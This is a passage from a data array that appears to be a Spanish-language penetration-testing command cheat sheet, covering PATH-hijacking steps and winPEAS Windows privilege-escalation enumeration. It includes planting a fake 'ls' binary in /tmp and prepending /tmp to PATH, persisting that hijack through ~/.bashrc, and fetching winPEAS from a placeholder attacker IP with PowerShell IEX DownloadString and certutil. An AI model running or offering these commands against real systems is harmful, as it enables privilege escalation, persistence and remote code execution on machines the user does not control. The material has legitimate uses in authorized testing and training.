    "desc": "Dir escribibles"
   },
   {
    "cmd": "printf '#!/bin/bash\\necho \"FAKE\"\\n' > /tmp/ls && chmod +x /tmp/ls",
    "desc": "Fake ls"
   },
   {
    "cmd": "export PATH=/tmp:$PATH",
    "desc": "PATH hijack"
   },
   {
    "cmd": "/tmp/ls",
    "desc": "Ejecutar fake"
   },
   {
    "cmd": "which tar",
    "desc": "Donde tar"
   },
   {
    "cmd": "ls -la /usr/local/bin/ | head",
    "desc": "Local bin"
   },
   {
    "cmd": "echo 'export PATH=/tmp:'$PATH >> ~/.bashrc",
    "desc": "Persistir"
   },
   {
    "cmd": "grep -rn '/usr/bin' /etc/cron* 2>/dev/null",
    "desc": "Cron usa bins"
   },
   {
    "cmd": "env -i bash -c 'echo $PATH'",
    "desc": "PATH limpio"
   },
   {
    "cmd": "strace -e execve ./script 2>&1 | head",
    "desc": "Traza exec"
   },
   {
    "cmd": "readelf -p .interp /bin/ls",
    "desc": "Interpreter"
   }
  ]
 },
 {
  "tool": "winpeas",
  "desc": "Enumeración PE de Windows",
  "commands": [
   {
    "cmd": "winpeas.exe",
    "desc": "Ejecutar"
   },
   {
    "cmd": "winpeas.exe -quiet",
    "desc": "Quiet"
   },
   {
    "cmd": "winpeas.exe -fast",
    "desc": "Rápido"
   },
   {
    "cmd": "winpeas.exe -wait",
    "desc": "Pausa"
   },
   {
    "cmd": "winpeas.exe -debug",
    "desc": "Debug"
   },
   {
    "cmd": "winpeas.exe -allinfo",
    "desc": "Toda la info"
   },
   {
    "cmd": "winpeas.exe -systeminfo",
    "desc": "System"
   },
   {
    "cmd": "winpeas.exe -userinfo",
    "desc": "Usuario"
   },
   {
    "cmd": "winpeas.exe -servicesinfo",
    "desc": "Servicios"
   },
   {
    "cmd": "winpeas.exe -fileinfo",
    "desc": "Archivos"
   },
   {
    "cmd": "winpeas.exe -checklists",
    "desc": "Checklists"
   },
   {
    "cmd": "winpeas.exe > out.txt && type out.txt",
    "desc": "A archivo"
   },
   {
    "cmd": "powershell -c 'IEX(New-Object Net.WebClient).DownloadString(\"http://IP/winPEASx64.exe\")'",
    "desc": "Descargar"
   },
   {
    "cmd": "certutil -urlcache -f http://IP/winPEASx64.exe winPEAS.exe",
    "desc": "Certutil"
   },
   {
    "cmd": "python3 -m http.server 80",
    "desc": "Servir"
   }
  ]
 }
];
